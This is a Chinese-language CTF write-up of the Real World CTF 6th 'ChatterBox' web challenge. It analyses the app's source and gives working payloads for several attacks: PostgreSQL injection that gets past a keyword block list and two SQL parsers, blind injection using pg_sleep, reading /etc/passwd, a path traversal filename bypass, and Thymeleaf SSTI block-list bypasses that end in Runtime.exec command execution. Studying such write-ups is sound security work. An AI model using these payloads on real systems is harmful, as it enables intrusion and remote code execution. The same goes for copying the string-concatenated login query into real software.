title: RWCTF 6th ChatterBox
author: Bmth
tags:
  - RWCTF
categories:
  - CTF
top_img: 'https://img-blog.csdnimg.cn/direct/54119071fbfd4323a58785365195d819.png'
cover: 'https://img-blog.csdnimg.cn/direct/54119071fbfd4323a58785365195d819.png'
date: 2024-02-24 21:28:00
---
![](https://img-blog.csdnimg.cn/direct/54119071fbfd4323a58785365195d819.png)

向晚意不适，驱车登古原。
夕阳无限好，只是近黄昏。
## PostgreSQL注入
首先该系统需要登录才能进行后续操作，因为验证的HttpSession

看到登录逻辑
```java
@RequestMapping({"/login"})
public String doLogin(HttpServletRequest request, Model model, HttpSession session) throws Exception {
  String username = request.getParameter("username");
  String password = request.getParameter("passwd");
  if (username != null && password != null) {
    if (!SQLCheck.checkBlackList(username) || !SQLCheck.checkBlackList(password)) {
      model.addAttribute("status", Integer.valueOf(500));
      model.addAttribute("message", "Ban!");
      return "error";
    } 
    String sql = "SELECT id,passwd FROM message_users WHERE username = '" + username + "'";
    if (SQLCheck.check(sql))
      try {
        List<String> pass = this.jdbcTemplate.query(sql, (RowMapper)new Object(this));
        if (!pass.isEmpty()) {
          String[] info = ((String)pass.get(0)).split("/");
          String dbPassword = info[1];
          if (dbPassword != null && dbPassword.equals(password)) {
            int userId = Integer.parseInt(info[0]);
            session.setAttribute("userId", Integer.valueOf(userId));
            return "redirect:/";
          } 
          model.addAttribute("status", Integer.valueOf(500));
          model.addAttribute("message", "Incorrect Username/Password);
        } else {
          model.addAttribute("status", Integer.valueOf(500));
          model.addAttribute("message", "Incorrect Username/Password);
        } 
        return "error";
      } catch (Exception var10) {
        model.addAttribute("status", Integer.valueOf(500));
        model.addAttribute("message", var10.toString());
        return "error";
      }  
    model.addAttribute("status", Integer.valueOf(500));
    model.addAttribute("message", "check error~");
    return "error";
  } 
  return "login";
}
```
首先调用 SQLCheck.checkBlackList 检测传入的参数，黑名单判断
```java
public static boolean checkBlackList(String sql) {
    String sql2 = sql.toUpperCase();
    for (String temp : getBlackList().stream()) {
        if (sql2.contains(temp)) {
            return false;
        }
    }
    return true;
}

private static List<String> getBlackList() {
  List<String> black = new ArrayList<>();
  black.add("SELECT");
  black.add("UNION");
  black.add("INSERT");
  black.add("ALTER");
  black.add("SLEEP");
  black.add("DELETE");
  black.add("--");
  black.add(";");
  black.add("#");
  black.add("&");
  black.add("/*");
  black.add("OR");
  black.add("EXEC");
  black.add("CREATE");
  black.add("AND");
  black.add("DROP");
  black.add("DO");
  black.add("COPY");
  black.add("SET");
  black.add("VACUUM");
  black.add("SHOW");
  black.add("CURSOR");
  black.add("TRUNCATE");
  black.add("CAST");
  black.add("BEGIN");
  black.add("PERFORM");
  black.add("END");
  black.add("CASE");
  black.add("WHEN");
  black.add("ALL");
  black.add("TABLE");
  black.add("UPDATE");
  black.add("TRIGGER");
  black.add("FUNCTION");
  black.add("PROCEDURE");
  black.add("DECLARE");
  black.add("RETURNING");
  black.add("TABLESPACE");
  black.add("VIEW");
  black.add("SEQUENCE");
  black.add("INDEX");
  black.add("LOCK");
  black.add("GRANT");
  black.add("REVOKE");
  black.add("SAVEPOINT");
  black.add("ROLLBACK");
  black.add("IMPORT");
  black.add("COMMIT");
  black.add("PREPARE");
  black.add("EXECUTE");
  black.add("EXPLAIN");
  black.add("ANALYZE");
  black.add("DATABASE");
  black.add("PASSWORD");
  black.add("CONNECT");
  black.add("DISCONNECT");
  black.add("PG_SLEEP");
  black.add("MERGE");
  black.add("USING");
  black.add("LIMIT");
  black.add("OFFSET");
  black.add("RETURN");
  black.add("ESCAPE");
  black.add("LIKE");
  black.add("ILIKE");
  black.add("RLIKE");
  black.add("EXISTS");
  black.add("BETWEEN");
  black.add("IS");
  black.add("NULL");
  black.add("NOT");
  black.add("GROUP");
  black.add("BY");
  black.add("HAVING");
  black.add("ORDER");
  black.add("WINDOW");
  black.add("PARTITION");
  black.add("OVER");
  black.add("FOREIGN KEY");
  black.add("REFERENCE");
  black.add("RAISE");
  black.add("LISTEN");
  black.add("NOTIFY");
  black.add("LOAD");
  black.add("SECURITY");
  black.add("OWNER");
  black.add("RULE");
  black.add("CLUSTER");
  black.add("COMMENT");
  black.add("CONVERT");
  black.add("COPY");
  black.add("CHECKPOINT");
  black.add("REINDEX");
  black.add("RESET");
  black.add("LANGUAGE");
  black.add("PLPGSQL");
  black.add("PLPYTHON");
  black.add("SECDEF");
  black.add("NOCREATEDB");
  black.add("NOCREATEROLE");
  black.add("NOINHERIT");
  black.add("NOREPLICATION");
  black.add("BYPASSRLS");
  black.add("FILE");
  black.add("PG_");
  black.add("IMPORT");
  black.add("EXPORT");
  return black;
}
```
很好理解，不能包含以上字符

然后使用`+`拼接username进行查询，这里就存在sql注入，但是在查询前调用了 SQLCheck.check 解析sql语句
```java
private static boolean checkValid(String sql) {
    try {
        return SQLParser.parse(sql);
    } catch (SQLException e) {
        try {
            List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, JdbcConstants.POSTGRESQL);
            if (sqlStatements != null && sqlStatements.size() > 1) {
                return false;
            }
            for (SQLStatement statement : sqlStatements.stream()) {
                if (statement instanceof PGSelectStatement) {
                    SQLSelect sqlSelect = ((SQLSelectStatement) statement).getSelect();
                    SQLSelectQuery sqlSelectQuery = sqlSelect.getQuery();
                    if (sqlSelectQuery instanceof SQLUnionQuery) {
                        return false;
                    }
                    SQLSelectQueryBlock sqlSelectQueryBlock = (SQLSelectQueryBlock) sqlSelectQuery;
                    if (!(filtetFields(sqlSelectQueryBlock.getSelectList()) && filterTableName((SQLExprTableSource) sqlSelectQueryBlock.getFrom()).booleanValue())) {
                        return false;
                    }
                    if (!filterWhere(sqlSelectQueryBlock.getWhere())) {
                        return false;
                    }
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            if (filter(sql)) {
                return true;
            }
            throw new SQLException("SQL Parsing Exception~");
        }
    }
}

public static boolean check(String sql) {
    return checkValid(sql.toUpperCase());
}
```
前置知识：
[https://pgpedia.info/q/query_to_xml.html](https://pgpedia.info/q/query_to_xml.html)
[http://postgres.cn/docs/9.4/sql-syntax-lexical.html](http://postgres.cn/docs/9.4/sql-syntax-lexical.html)
[PostgreSQL——双冒号(::)的含义](https://blog.csdn.net/qq_36501591/article/details/126214831)
[PostgreSQL text 数据类型介绍](https://www.sjkjc.com/postgresql-ref/text-datatype/)
[PostgreSQL: || Operator](https://www.techonthenet.com/postgresql/functions/concat2.php)

### 方法一
这里其实有一个很奇怪的点，如果sql语句进入到第二层 catch 异常处理，就会调用 filter 方法
![](https://img-blog.csdnimg.cn/direct/092e5b1f85464302a66810fd236377e4.png)

如果`sql.contains(" USER_DEFINE ")`，则直接返回true

1. 第一层`SQLParser.parse(sql)`，使用jsqlparser解析sql语句
2. 第二层`SQLUtils.parseStatements(sql, JdbcConstants.POSTGRESQL)`，使用Druid解析sql语句

假如能使两个解析器都报错，同时语句也能够在数据库中正常执行，就实现了绕过

payload1：
```
username='||passwd::int||text' USER_DEFINE &passwd=123
```
payload2：
使用`WITH AS`子查询，每个WITH子句中的辅助语句可以是一个SELECT、INSERT、UPDATE 或 DELETE

使用values产生报错
```
username='||passwd::int||(with USER_DEFINE as (values(1)) values(1))||'&passwd=123
```
payload3：
注意到在执行检测前转换为了大写，而执行查询将保持小写
![](https://img-blog.csdnimg.cn/direct/b958213e96aa4b0e8a051fc4b7126977.png)

我们需要找到一种语句在大写时报错，小写时正常执行

即`$`，一个美元符引用字符串的标签(如果有标签的话)，遵循和无引号包围的标识符相同的规则， 只是它不能包含美元符。标签是大小写敏感的，因此`$tag$String content$tag$`是正确的，而`$TAG$String content$tag$`则是错误的
```
username='||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)||passwd::json||'&passwd=123
```
![](https://img-blog.csdnimg.cn/direct/fc9a9c7e8ca44296ac10f82e817b36e8.png)

最终会将异常打印出来
![](https://img-blog.csdnimg.cn/direct/63420f6014a4447a94a243ce9ecc5a0e.png)


### 方法二
我们可以使用`||`连接字符来绕过黑名单
![](https://img-blog.csdnimg.cn/direct/945d3981968340c2915952e369eaedb7.png)

使用 query_to_xml 函数内嵌sql语句，pg_sleep时间盲注

还可以使用decode函数，传hex字符
![](https://img-blog.csdnimg.cn/direct/250f132e4d6c46659fb925aedf1ef97e.png)

最后给出的poc如下：
```
'||''||(query_to_xml('sele'||'ct ca'||'se wh'||'en substr((sele'||'ct passwd from message_users),1,1)=chr(120) then p'||'g_sl'||'eep(3) else p'||'g_sl'||'eep(0) en'||'d',true,true,''))||'1

'||''||(query_to_xml(encode(decode('73656c6563742063617365207768656e20737562737472282873656c656374207061737377642066726f6d206d6573736167655f7573657273292c312c31293d6368722831323029207468656e2070675f736c65657028332920656c73652070675f736c65657028302920656e64','hex'),'esc'||'ape'),true,true,''))||'1
```

### 任意文件读写
进入后台可以看到路由`/post_message`
![](https://img-blog.csdnimg.cn/direct/2a1c53941c08483abbe8a343b5915750.png)

又是一个sql注入，不细说了，可以使用pg_ls_dir、pg_read_file读文件，又或者lo_from_bytea配合lo_export写文件
![](https://img-blog.csdnimg.cn/direct/266c70cd59444d6388d5ec7562a07471.png)

这里官方wp给出了另外一种函数：`ts_stat`，同样可以执行sql语句
![](https://img-blog.csdnimg.cn/direct/98bb7e9d2f6546728e3a623aeb47291e.png)

注意需要配合to_tsvector函数处理成tsvector数据类型：
```sql
SELECT to_tsvector('english', pg_read_file('/etc/passwd'));
```

## 模板注入
往后看到路由`/notify`
![](https://img-blog.csdnimg.cn/direct/9290429bb9cc4cb5b4374401a2abbf82.png)

如果传入的fname不包含`../`并且文件内容不包含<、>、org.apache、org.spring，则使用SpringTemplateEngine解析

### 文件名绕过
```
cleanPath:701, StringUtils (org.springframework.util)
toURL:399, ResourceUtils (org.springframework.util)
getResource:165, DefaultResourceLoader (org.springframework.core.io)
getResource:248, GenericApplicationContext (org.springframework.context.support)
notify:40, NotifyController (com.chatterbox.controller)
```
看到`org.springframework.util.StringUtils#cleanPath`处理path的地方
![](https://img-blog.csdnimg.cn/direct/f027f155444648f4a29888d08d2fbfd8.png)

会将`\`替换为`/`，然后通过`../`替换掉 non_exists 路径
![](https://img-blog.csdnimg.cn/direct/957368f99c5a44d495a7861c6c659994.png)

最后由于是`file:`协议，使用`#`或者`?`来绕过后缀限制
```
?fname=..%5cetc/passwd%3F
?fname=..%5cetc/passwd%23
```

### 标签绕过
由于过滤了<、>，我们无法使用标签
看到：[https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#expression-inlining](https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#expression-inlining)

可以使用中括号内联表达式，即`[[${2*2}]]`

官网wp还提供了一种方法：

看到：[https://github.com/thymeleaf/thymeleaf/blob/3.1-master/lib/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringStandardExpressionUtils.java](https://github.com/thymeleaf/thymeleaf/blob/3.1-master/lib/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringStandardExpressionUtils.java)
![](https://img-blog.csdnimg.cn/direct/a0b5f9affda049968e5a9b8723dabf50.png)

检测new后面是否为空格，如果检测到`new xxx`则直接返回true

看到解析new的方法：
`org.springframework.expression.spel.standard.InternalSpelExpressionParser#maybeEatConstructorReference`
![](https://img-blog.csdnimg.cn/direct/8a46dc907785459b848d2a7e356dfe35.png)

发现即使不满足package，也可以实现实例化，跟进eatPossiblyQualifiedId方法
![](https://img-blog.csdnimg.cn/direct/0de35664c4184060bf5d17ccf14b73a0.png)

发现会跳过`.`

所以我们就可以使用
```java
__${new.java..lang...String()}__::.x
```


### 黑名单绕过
类型限制：
在`org.thymeleaf.util.ExpressionUtils#isTypeAllowed`
![](https://img-blog.csdnimg.cn/direct/1195e0796ede45ee847754ca28f6a77d.png)

跟进 isTypeBlockedForTypeReference 方法
![](https://img-blog.csdnimg.cn/direct/53de16b2ec684000aa1894f8809db100.png)

跟进 isTypeBlockedForAllPurposes 方法
![](https://img-blog.csdnimg.cn/direct/e33844cde4174d7ebf40298886d5b66c.png)

如果类的首字符不为c、j、o、s，则直接返回false，否则步入后续验证，进行黑名单匹配
看到`BLOCKED_ALL_PURPOSES_PACKAGE_NAME_PREFIXES`
```
0 = "jakarta."
1 = "org.xml.sax."
2 = "sun."
3 = "org.ietf.jgss."
4 = "javax."
5 = "org.omg."
6 = "com.sun."
7 = "org.w3c.dom."
8 = "jdk."
9 = "java."
```

看到`BLOCKED_TYPE_REFERENCE_PACKAGE_NAME_PREFIXES`
```
0 = "org.springframework.beans."
1 = "org.springframework.aspects."
2 = "javax0.geci."
3 = "org.javassist."
4 = "com.squareup.javapoet."
5 = "javassist."
6 = "org.objectweb.asm."
7 = "net.sf.cglib."
8 = "org.springframework.javapoet."
9 = "org.springframework.asm."
10 = "org.springframework.webflow."
11 = "org.springframework.cglib."
12 = "net.bytebuddy."
13 = "org.springframework.objenesis."
14 = "org.springframework.aot."
15 = "org.springframework.context."
16 = "org.objenesis."
17 = "org.mockito."
18 = "org.springframework.web."
19 = "org.aspectj."
20 = "org.springframework.util."
21 = "org.apache.bcel."
22 = "org.springframework.expression."
23 = "org.springframework.aop."
```

成员限制：
在`org.thymeleaf.util.ExpressionUtils#isMemberAllowed`
![](https://img-blog.csdnimg.cn/direct/9505005b94754b54ad56ea8048c90f0a.png)

如果target不为Class的实例，则调用 isMemberAllowedForInstanceOfType 方法处理
![](https://img-blog.csdnimg.cn/direct/b3a72ee8c04c4c5e82ea5490014f91c4.png)

使用isAssignableFrom方法判断是否为某个类的父类，看到`BLOCKED_MEMBER_CALL_JAVA_SUPERS`
```
org.thymeleaf.spring6.expression.IThymeleafEvaluationContext
org.springframework.web.servlet.support.RequestContext
org.thymeleaf.spring6.context.IThymeleafRequestContext
org.thymeleaf.standard.expression.IStandardExpressionParser
org.thymeleaf.standard.expression.IStandardVariableExpressionEvaluator
org.thymeleaf.standard.expression.IStandardConversionService
```
当前 thymeleaf 版本为3.1.2

关注一下3.1.1.RELEASE的绕过姿势：[https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI](https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI)

主要是通过`org.springframework.util.ReflectionUtils`反射调用，那么我们找一个替代类同样具有反射的功能即可

tabby启动！，选择查找public以及静态方法
```
match (source:Method {IS_PUBLIC:true,IS_STATIC:true})
  where not(source.CLASSNAME starts with 'org.springframework.')
    and not(source.CLASSNAME starts with 'java.')
    and not(source.CLASSNAME starts with 'jakarata.')
    and not(source.CLASSNAME starts with 'jdk.')
    and not(source.CLASSNAME starts with 'com.sun.')
    and not(source.CLASSNAME starts with 'sun.')
    and not(source.CLASSNAME starts with 'org.xml.sax.')
    and not(source.CLASSNAME starts with 'org.w3c.dom.')
    and not(source.CLASSNAME starts with 'org.omg.')
    and not(source.CLASSNAME starts with 'org.thymeleaf.')
match (sink:Method {}) where sink.NAME in ["forName","loadClass","createInstance","classForName","getMethod","callMethodN","getDeclaredMethods"]
call tabby.beta.findPath(source, "-", sink, 2, false) yield path
return path limit 20
```
![](https://img-blog.csdnimg.cn/direct/f742b62899084f1f9f3d53c46e97e6b1.png)

#### poc1
wh1t3p1g师傅找的，思路是通过`com.zaxxer.hikari.util.UtilityElf#createInstance`构建`jakarta.el.ELProcessor`对象，然后再通过`org.apache.tomcat.util.IntrospectionUtils#callMethodN`来调用它的 eval 函数，因为环境是 jdk17，所以后续的 EL 利用的是`jdk.jshell.JShell`来执行任意代码
![](https://img-blog.csdnimg.cn/direct/a12da3d930cc49a0b0ce2f1342f661aa.png)

![](https://img-blog.csdnimg.cn/direct/9185f89ec8264d45819f9f40687cf1e6.png)

```java
[[${T(org. apache.tomcat.util.IntrospectionUtils).callMethodN(T(com.zaxxer.hikari.util.UtilityElf).createInstance('jakarta.el.ELProcessor',T(ch.qos.logback.core.util.Loader).loadClass('jakarta.el.ELProcessor')), 'eval', new java.lang.String[]{'"".getClass().forName("jdk.jshell.JShell").getMethods()[6].invoke("".getClass().forName("jdk.jshell.JShell")).eval("java.lang.Runtime.getRuntime().exec(\"touch /tmp/success\")")'}, T(org. apache.el.util.ReflectionUtil).toTypeArray(new java.lang.String[]{"java.lang.String"}))}]]
```

#### poc2
官方wp：

比上面多了实例化`org.springframework.instrument.classloading.ShadowingClassLoader`并调用其loadClass方法
![](https://img-blog.csdnimg.cn/direct/770d457608794c75b9e38fedaa1d411b.png)

然后反射调用的是经典的`java.lang.Runtime`

```java
__${new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().findMethod(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass("java.lang.Runtime"),"getRuntime",null),"invoke",{null,null},{new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass("java.lang.Object"),new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass("org.thymeleaf.util.ClassLoaderUtils").loadClass("[Ljava.lang.Object;")}),"exec","touch /tmp/success",new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass("java.lang.String"))}__::.x
```

当然师傅们还有很多巧妙的思路，就不多赘述了

## Tomcat临时文件
具体思路参考：[https://tttang.com/archive/1692/#toc__4](https://tttang.com/archive/1692/#toc__4)

看到SpringMVC的`org.springframework.web.servlet.DispatcherServlet#doDispatch`
![](https://img-blog.csdnimg.cn/direct/86132dd24fd24dfbb802282f244a7f04.png)

其中会检查这是否是一个表单请求
```
parseParts:2703, Request (org.apache.catalina.connector)
getParts:2685, Request (org.apache.catalina.connector)
getParts:773, RequestFacade (org.apache.catalina.connector)
parseRequest:93, StandardMultipartHttpServletRequest (org.springframework.web.multipart.support)
<init>:86, StandardMultipartHttpServletRequest (org.springframework.web.multipart.support)
resolveMultipart:112, StandardServletMultipartResolver (org.springframework.web.multipart.support)
checkMultipart:1227, DispatcherServlet (org.springframework.web.servlet)
doDispatch:1061, DispatcherServlet (org.springframework.web.servlet)
```
后续跟进到`org.apache.catalina.connector.Request#parseParts`
![](https://img-blog.csdnimg.cn/direct/1464ecb8262b49a1a557273754d4c292.png)

看到目录为`/tmp/tomcat.8080.15601954988790012368/work/Tomcat/localhost/ROOT`

最终生成临时文件
![](https://img-blog.csdnimg.cn/direct/4f4efded732140db8a0f8b17973553ce.png)

但是我测试的时候从`/proc`目录下根本没读出来，相当于另一种思路吧


参考：
[Thymeleaf ssti 3.1.2 黑名单绕过](https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/)
[【第6届RWCTF】ChatterBox 题目讲解](https://www.bilibili.com/video/BV1t7421K7rB/)
[RealWorld CTF 6th 正赛/体验赛 部分 Web Writeup](https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/)
[2024RWCTF WriteUp By Mini-Venom](https://mp.weixin.qq.com/s/XV8pIDvjXYFlS9F1k02UIQ)
[ChatterBox | RealWorld CTF 6th](https://vozec.fr/writeups/chatterbox-realworld-ctf-2024/)
